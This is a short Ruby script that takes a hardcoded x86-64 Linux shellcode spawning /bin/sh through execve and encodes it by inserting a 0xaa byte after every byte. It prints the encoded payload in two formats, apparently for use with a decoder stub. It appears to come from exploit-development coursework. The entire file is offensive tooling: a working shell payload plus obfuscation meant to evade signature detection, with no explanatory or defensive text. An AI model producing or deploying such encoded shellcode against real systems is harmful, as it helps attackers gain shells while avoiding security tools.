#!/usr/bin/ruby

#-------------------------------
# Insertion Encoder Shellcodes #
# ------------------------------

puts "\e[1m\e[32m[*]Encoding Shellcode...\e[0m"

shellcode = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"

encoded = String.new
encoded2 = String.new

shellcode.each_byte do |byte|
    encoded += "\\x"
    encoded += byte.to_s(16)
    encoded += "\\xaa"

    encoded2 += "0x"
    encoded2 += byte.to_s(16)
    encoded2 += ','
    encoded2 += "0xaa,"
end

puts "\e[1m\e[32m[+]Encoded Shellcode\e[0m"
puts "\e[1m\e[33m[+]Type 0x1\e[0m"
puts encoded
puts "\e[1m\e[33m[+]Type 0x2\e[0m"
puts encoded2 + "\n\n"

